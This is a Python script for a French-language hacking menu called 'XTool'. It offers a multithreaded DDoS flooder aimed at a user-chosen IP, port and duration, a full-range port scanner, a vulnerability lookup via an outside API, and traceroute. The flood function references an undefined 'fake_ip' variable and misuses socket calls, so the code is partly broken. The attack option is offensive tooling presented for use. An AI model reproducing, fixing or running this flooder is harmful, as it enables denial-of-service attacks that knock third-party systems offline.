import socket
import threading
import time
import os
import requests
import subprocess

def attaque(target_ip, target_port, paquets, duree_attaque, nombre_threads):
    def ddos():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target_ip, target_port))
        for _ in range(paquets):
            s.sendto(("X-a: {}\r\n".format(fake_ip)).encode('ascii'), (target_ip, target_port))
        s.close()
    
    end_time = time.time() + duree_attaque
    while time.time() < end_time:
        for i in range(nombre_threads):
            thread = threading.Thread(target=ddos)
            thread.start()

def scan_port(ip, port_range):
    open_ports = []
    for port in port_range:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((ip, port))
        if result == 0:
            open_ports.append(port)
        sock.close()
    return open_ports

def scan_vulnerabilities(ip):
    response = requests.get(f"https://vulnscan.org/api/{ip}")
    if response.status_code == 200:
        return response.json()
    else:
        return None

def traceroute(target):
    result = subprocess.run(["traceroute", target], capture_output=True, text=True)
    return result.stdout

def menu_principal():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print("\033[1;36m")
        print("******************************************")
        print("*                                        *")
        print("*                  \033[1;31mXTool\033[1;36m                 *")
        print("*                                        *")
        print("******************************************")
        print("*  \033[1;33m1.\033[1;36m Lancer une attaque DDoS            *")
        print("*  \033[1;33m2.\033[1;36m Scanner les ports                   *")
        print("*  \033[1;33m3.\033[1;36m Scanner les vulnérabilités          *")
        print("*  \033[1;33m4.\033[1;36m Traceroute                          *")
        print("*  \033[1;33m5.\033[1;36m Quitter                            *")
        print("*                                        *")
        print("******************************************")
        print("\033[0m")
        
        choix = input("\033[1;33mEntrez votre choix : \033[0m")
        
        if choix == '1':
            target_ip = input("\033[1;32mEntrez l'adresse IP cible : \033[0m")
            target_port = int(input("\033[1;32mEntrez le port cible : \033[0m"))
            duree_attaque = int(input("\033[1;32mEntrez la durée de l'attaque (secondes) : \033[0m"))
            nombre_threads = int(input("\033[1;32mEntrez le nombre de threads : \033[0m"))
            paquets = int(input("\033[1;32mEntrez le nombre de paquets par connexion : \033[0m"))
            print("\033[1;31mLancement de l'attaque...\033[0m")
            attaque(target_ip, target_port, paquets, duree_attaque, nombre_threads)
            print("\033[1;32mAttaque terminée.\033[0m")
            input("\033[1;33mAppuyez sur Entrée pour revenir au menu principal...\033[0m")
        elif choix == '2':
            ip = input("\033[1;32mEntrez l'adresse IP à scanner : \033[0m")
            port_range = range(1, 65535)
            open_ports = scan_port(ip, port_range)
            if open_ports:
                print(f"\033[1;32mPorts ouverts sur {ip} : {open_ports}\033[0m")
            else:
                print(f"\033[1;31mAucun port ouvert trouvé sur {ip}.\033[0m")
            input("\033[1;33mAppuyez sur Entrée pour revenir au menu principal...\033[0m")
        elif choix == '3':
            ip = input("\033[1;32mEntrez l'adresse IP à scanner pour les vulnérabilités : \033[0m")
            vulnerabilities = scan_vulnerabilities(ip)
            if vulnerabilities:
                print(f"\033[1;32mVulnérabilités trouvées sur {ip} : {vulnerabilities}\033[0m")
            else:
                print(f"\033[1;31mAucune vulnérabilité trouvée ou erreur lors du scan pour {ip}.\033[0m")
            input("\033[1;33mAppuyez sur Entrée pour revenir au menu principal...\033[0m")
        elif choix == '4':
            target = input("\033[1;32mEntrez l'adresse cible pour traceroute : \033[0m")
            result = traceroute(target)
            print(f"\033[1;32mTraceroute pour {target} :\033[0m\n{result}")
            input("\033[1;33mAppuyez sur Entrée pour revenir au menu principal...\033[0m")
        elif choix == '5':
            print("\033[1;31mQuitter...\033[0m")
            break
        else:
            print("\033[1;31mChoix invalide. Veuillez réessayer.\033[0m")
            time.sleep(2)

if __name__ == "__main__":
    menu_principal()
